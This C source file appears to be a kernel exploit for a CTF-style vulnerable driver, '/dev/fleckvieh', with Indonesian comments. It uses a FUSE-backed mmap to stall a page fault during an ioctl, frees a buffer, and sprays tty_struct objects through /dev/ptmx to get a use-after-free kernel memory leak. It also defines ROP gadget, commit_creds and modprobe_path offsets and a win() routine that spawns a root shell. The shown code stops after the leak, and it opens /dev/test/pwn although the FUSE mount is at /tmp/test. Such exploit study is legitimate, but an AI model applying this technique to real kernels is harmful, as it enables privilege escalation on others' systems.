#define _GNU_SOURCE
#define FUSE_USE_VERSION 31
#include<fuse.h>
#include<errno.h>
#include<assert.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/ioctl.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<sys/mman.h>
#include<fcntl.h>
#include<pthread.h>
#include<sched.h>
#include<signal.h>

#define ERR(msg)    \
        do{     \
        perror(msg); \
        exit(EXIT_FAILURE);}while(0)

#define ofs_tty_ops 0xc3c3c0
#define addr_modprobe_path (kbase + 0xe37ea0)
#define rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp (kbase + 0x09b13a)
#define rop_pop_rdi (kbase + 0x09b0ed)
#define addr_init_cred (kbase + 0xe37480)
#define addr_commit_creds (kbase + 0x072830)
#define addr_kpti_trampoline (kbase + 0x800e26)

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

unsigned long user_cs, user_ss, user_rsp, user_rflags;
char *buf;
int fd;
cpu_set_t pwn_cpu;

int victim;
int ptmx[0x10];

typedef struct{
    int id;
    size_t size;
    char *data;
}request_t;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}
int add(char *data, size_t size)
{
    request_t req = {
        .size = size,
        .data = data
    };

    int r = ioctl(fd,CMD_ADD,&req);
    if(r==-1){
        ERR("ioctl(blob_add)");
    }
    return r;
}

int del(int id)
{
    request_t req = {
        .id = id
    };
    int r = ioctl(fd,CMD_DEL,&req);
    if(r==-1){
        ERR("ioctl(blob_del)");
    }
    return r;
}

int set(int id, char *data, size_t size)
{
    request_t req = {
        .id = id,
        .size = size,
        .data = data
    };
    int r = ioctl(fd,CMD_SET,&req);
    if(r==-1){
        ERR("ioctl(blob_set)");
    }
    return r;
}

int get(int id, char *data, size_t size)
{
    request_t req = {
        .id = id,
        .size = size,
        .data = data
    };
    int r = ioctl(fd,CMD_GET,&req);
    if(r==-1){
        ERR("ioctl(blob_get)");
    }
    return r;
}


static int getattr_callback(const char *path,  struct stat *statbuf)
{
    puts("[+] getattr_calback");
    memset(statbuf,0,sizeof(struct stat)); 

    /* Memeriksa apakah jalur dari titik mount adalah "/file" */
    if(strcmp(path,"/pwn")==0){
        statbuf->st_mode = S_IFREG | 0777; //izin
        statbuf->st_nlink = 1; //jumlah hardlink
        statbuf->st_size = 0x1000; //ukuran berkas
        return 0;
    }   

    return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *file_info)
{
    puts("[+] open callback");
    return 0;
}

static int read_callback(const char *path,char *buf, size_t size,
            off_t offset, struct fuse_file_info *file_info)
{
    static int fault_cnt = 0;
    puts("[+] read callback");
    printf("path: %s\n" ,path);
    printf("size: 0x%1lx\n" ,size);
    printf("offset: 0x%1lx\n" ,offset);
 
    if(strcmp(path,"/pwn")==0){
        switch(fault_cnt++){
            case 0:
                puts("[+] UAF read");
                /* [1-2] Kesalahan halaman karena `blob_get` */
                // lepaskan korban
                del(victim);

                //semprotkan tty_struct, maka akan di tempatkan
                //di lokasi bekas victim yang sebelumnya di hapus
                int fds[0x10];
                for(int i=0;i<0x10;i++){
                    fds[i] = open("/dev/ptmx",O_RDONLY|O_NOCTTY);
                    if(fds[i]==-1){
                        ERR("open(ptmx)");
                    }
                }
                return size;
        }
    }
    return -ENOENT;
}            

static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
};

int setup_done = 0;

void *fuse_thread(void *arg)
{
    struct fuse_args args = FUSE_ARGS_INIT(0,NULL);
    struct fuse_chan *chan;
    struct fuse *my_fuse;

    if(mkdir("/tmp/test",0777)){
        ERR("mkdir(\"/tmp/test\")");
    }

    if(!(chan = fuse_mount("/tmp/test",&args))){
        ERR("fuse_mount(/tmp/test)");
    }
    if(!(my_fuse = fuse_new(chan,&args,&fops,sizeof(fops),NULL))){
        fuse_unmount("/tmp/test",chan);
        ERR("fuse_new");
    }
    /* Jalankan thread utama pada CPU yang sama */

    if(sched_setaffinity(0,sizeof(cpu_set_t),&pwn_cpu)){
        ERR("sched_setaffinity");
    }

    fuse_set_signal_handlers(fuse_get_session(my_fuse));
    setup_done = 1;
    fuse_loop_mt(my_fuse);

    fuse_unmount("/tmp/test",chan);

    return NULL;

}

int main(int argc, char *argv[])
{
    /* Pastikan thread utama dan thread FUSE berjalan pada CPU yang sama */
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0,&pwn_cpu);

    if(sched_setaffinity(0,sizeof(cpu_set_t),&pwn_cpu)){
        ERR("sched_setaffinity[main]");
    }
    pthread_t th;
    pthread_create(&th,NULL,fuse_thread,NULL);
    while(!setup_done);
    /*
   * Eksploitasi tubuh
   */
    fd = open("/dev/fleckvieh",O_RDWR);
    if(fd==-1){
        ERR("open(/dev/fleckvieh)");
    }
    /* Memetakan file FUSE ke memori */
    int pwn_fd = open("/dev/test/pwn",O_RDWR);
    if(pwn_fd==-1){
        ERR("/dev/test/pwn");
    }

    void *page;
    page = mmap(NULL,0x1000,PROT_READ|PROT_WRITE,
            MAP_PRIVATE,pwn_fd,0);
    if(page==MAP_FAILED){
        ERR("mmap");
    }            

    /* Pengaturan data dengan ukuran yang sama dengan tty_struct */
    buf = (char*)malloc(0x400);
    victim = add(buf,0x400);
    set(victim,"hello",6);

    /*1-1 UAF read*/
    get(victim,page,0x400);

    for(int i=0;i<0x80;i+=8){
        printf("%d: 0x%16lx\n" ,i,*(unsigned long*)(page + i));
    }

 
    return EXIT_SUCCESS;
}